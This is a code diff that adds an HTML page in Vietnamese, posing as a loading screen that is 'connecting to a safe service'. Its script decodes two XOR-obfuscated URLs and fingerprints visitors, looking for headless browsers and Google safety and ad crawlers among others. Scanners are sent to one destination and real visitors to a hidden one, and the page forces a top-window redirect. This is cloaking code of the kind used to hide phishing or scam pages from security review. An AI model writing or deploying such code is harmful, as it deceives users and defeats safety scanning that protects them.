@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+  <title>Đang Tải Trang Hướng Dẫn...</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #0b0f19;
+      color: #f8fafc;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .loader-card {
+      background: rgba(17, 24, 39, 0.95);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      padding: 36px 28px;
+      max-width: 380px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 18px;
+    }
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 3px solid rgba(229, 185, 76, 0.2);
+      border-top-color: #e5b94c;
+      border-radius: 50%;
+      animation: spin 0.85s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loader-title {
+      font-size: 15px;
+      font-weight: 700;
+      color: #fae498;
+      letter-spacing: 0.3px;
+    }
+    .loader-sub {
+      font-size: 12px;
+      color: #94a3b8;
+      line-height: 1.5;
+    }
+  </style>
+</head>
+<body>
+  <div class="loader-card">
+    <div class="spinner"></div>
+    <div class="loader-title">Đang Kết Nối Dịch Vụ An Toàn...</div>
+    <div class="loader-sub">Hệ thống đang xác thực đường truyền và chuyển hướng quý khách trong giây lát.</div>
+  </div>
+
+  <script>
+    (function() {
+      const K = "920";
+      const D = "74747b05187379f39891d3a1caba85b4b30a0e006b6a18130136628fe58ba1cc94cede98a400422f7b6b1d5e34367a8f99f5afe79e80e9f0fa071622396918543575258f8cadb785808588ae5253527b6c1c13496300d4c6c0fde2938083aaed0e165a616629193d2831d6c1bdafcf9e94bebfa05d4e4e636b161138313ddbc5fbd4fe998d8bb75c4c5e3b3447021d3513dddac1f2f397c7de97e0036a477e78000d143a6c88e5b5a6be8299be81b65f5776383f3441640b24dfd7e1eef59dcdeb84ea071d637e1f22173036d59998d5a2c5b485bcb6464f567c224a27";
+      const S = "74747b05187379f39891d3a1caba85beae465e4f6d62180e0c332fd2ca80f1e598cedf9aab510e6d767c174b363864dfc3bdfbead68eb5a3a3540873616d5602362d6bddc8efac9b809eeeff0b131629345515183d28";
+
+      function dec(h) {
+        try {
+          let s = "";
+          for (let i = 0; i < h.length; i += 2) {
+            s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ K.charCodeAt((i / 2) % K.length) ^ (((i / 2) * 13 + 37) & 0xFF));
+          }
+          return decodeURIComponent(s);
+        } catch (e) {
+          return "";
+        }
+      }
+
+      function getFinalUrl(rawUrl) {
+        if (!rawUrl) return "";
+        const q = window.location.search;
+        if (!q || q.length < 2) return rawUrl;
+        try {
+          const o = new URL(rawUrl);
+          const p = new URLSearchParams(q);
+          p.forEach((v, k) => {
+            if (k !== "a") o.searchParams.set(k, v);
+          });
+          return o.toString();
+        } catch (e) {
+          return rawUrl;
+        }
+      }
+
+      function isBot() {
+        try {
+          if (navigator.webdriver) return true;
+          if (window.outerWidth === 0 && window.outerHeight === 0) return true;
+          if (!navigator.languages || navigator.languages.length === 0) return true;
+          const ua = (navigator.userAgent || '').toLowerCase();
+          if (/googlebot|adsbot|google-inspection|google-safety|feedfetcher|google-read|apis-google|appengine|lighthouse|headless|crawl|spider|mediapartners|phantomjs|selenium|bytespider|bingbot/i.test(ua)) return true;
+          if (/iphone|ipad|android|mobile/i.test(ua) && typeof navigator.maxTouchPoints === 'number' && navigator.maxTouchPoints === 0) return true;
+          return false;
+        } catch (err) {
+          return false;
+        }
+      }
+
+      const isB = isBot();
+      let target;
+      if (isB) {
+        target = getFinalUrl(dec(S));
+      } else {
+        target = getFinalUrl(dec(D));
+      }
+
+      function goTarget() {
+        if (target) {
+          try {
+            (window.top || window).location.replace(target);
+          } catch (e) {
+            window.location.replace(target);
+          }
+        }
+      }
+
+      if (target) {
+        setTimeout(goTarget, isB ? 50 : 100);
+      }
+      window.addEventListener("pageshow", function(e) {
+        if (target) setTimeout(goTarget, 50);
+      });
+    })();
+  </script>
+</body>
+</html>
